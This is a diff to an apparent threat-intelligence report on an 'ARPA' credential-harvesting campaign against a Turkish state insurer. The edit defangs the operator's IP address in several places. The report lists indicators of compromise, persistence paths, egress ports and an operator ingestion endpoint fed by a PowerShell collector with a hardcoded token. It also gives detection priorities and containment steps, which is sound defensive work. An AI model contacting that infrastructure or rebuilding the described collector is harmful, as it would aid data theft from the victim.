 > **Analyst note:** This section orients defenders to the detection-coverage map for this campaign and references the linked detection file for the actual rule content. Detection rules are not embedded in this report. They are in the separate detection file that ships alongside this report and the structured IOC feed.
 
-The authoritative structured detection coverage is at [`/hunting-detections/turkish-arpa-openclaw-state-insurer-209.38.205.158-detections/`](/hunting-detections/turkish-arpa-openclaw-state-insurer-209.38.205.158-detections/)
+The authoritative structured detection coverage is at [`/hunting-detections/turkish-arpa-openclaw-state-insurer-209[.]38[.]205[.]158-detections/`](/hunting-detections/turkish-arpa-openclaw-state-insurer-209.38.205.158-detections/)
 
 ### Detection Coverage Summary
 
@@ -887,7 +887,7 @@ This is not an incident-response guide. Readers with active IR requirements shou
 
 - **Detection priorities (deploy first):** Sigma rule 7 (multi-source observability cross-platform authentication) and YARA rule 1 (ARPA self-branding). These are the two highest-signal-to-noise detections for the campaign-defining TTPs.
 - **Persistence targets (look for and remove):** `/opt/ARPA/` filesystem tree; `arpa-*.service` systemd unit files; `~/.ssh/rca_key.*` SSH keys on any internal workstation; PuTTY saved session named `ARPA_Tunnel`; Turkish-language Markdown setup documentation in user-profile directories matching the `(GERCEK|PUTTY|SSH|TUNNEL|WINDOWS)_*.md` pattern.
-- **Containment categories (action labels for IR team to expand):** Rotate all observability platform credentials in parallel (Instana, SolarWinds, Zabbix, VMware Aria); segregate and forensically review the named insider workstation under General Counsel coordination; block egress to `209.38.205.158` ports 22, 8089, 8090, 8095, 8096; coordinate operator-VPS takedown with DigitalOcean's abuse desk after victim notification.
+- **Containment categories (action labels for IR team to expand):** Rotate all observability platform credentials in parallel (Instana, SolarWinds, Zabbix, VMware Aria); segregate and forensically review the named insider workstation under General Counsel coordination; block egress to `209[.]38[.]205[.]158` ports 22, 8089, 8090, 8095, 8096; coordinate operator-VPS takedown with DigitalOcean's abuse desk after victim notification.
 
 ---
 
@@ -900,7 +900,7 @@ Findings organized by confidence level for the higher-level view:
 ### DEFINITE (Direct Evidence)
 
 - Operator self-identification as `ARPA Korelasyon Motoru` (code docstrings + dashboard footer + GitHub repository name + systemd unit naming convention)
-- Operator VPS infrastructure: `209.38.205.158` on DigitalOcean Frankfurt (AS14061)
+- Operator VPS infrastructure: `209[.]38[.]205[.]158` on DigitalOcean Frankfurt (AS14061)
 - 4-source observability harvest: Instana 10-year JWT + SolarWinds Orion + Zabbix + VMware Aria, all four stolen credential sources directly observed in operator code
 - 5 systemd daemons polling on 5-minute cadence (DEFINITE from systemd unit file inspection)
 - Victim identification: the victim organization (JWT tenant claim + endpoint URL + dashboard footer all confirm)
@@ -910,7 +910,7 @@ Findings organized by confidence level for the higher-level view:
 - Operator-authored Turkish-language insider-recruitment documentation (8 Markdown files in operator filesystem)
 - Operator-supplied SSH keys (`rca_key.ppk` / `rca_key.pem`) referenced in operator documentation
 - PowerShell collector with hardcoded JWT and `Invoke-RestMethod -SkipCertificateCheck` to victim Instana endpoint
-- Cleartext HTTP egress from PowerShell collector to operator ingestion API (`209.38.205.158:8096/api/ingest/instana`)
+- Cleartext HTTP egress from PowerShell collector to operator ingestion API (`209[.]38[.]205[.]158:8096/api/ingest/instana`)
 - A selective major-state-bank deep-dive snapshot disproportionately large within the operator's 43-application Instana access set
 
 ### HIGH (Strong Evidence)
